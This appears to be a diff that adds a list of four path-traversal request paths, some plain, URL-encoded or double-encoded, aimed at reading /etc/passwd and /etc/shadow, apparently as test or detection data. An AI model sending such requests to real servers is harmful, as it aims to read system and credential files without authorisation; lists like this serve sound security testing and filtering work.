@@ -1,0 +1,4 @@
+/static/../../etc/passwd
+/static/..%2f..%2fetc/passwd
+/download?file=../../../../etc/shadow
+/a/%252e%252e/%252e%252e/etc/passwd
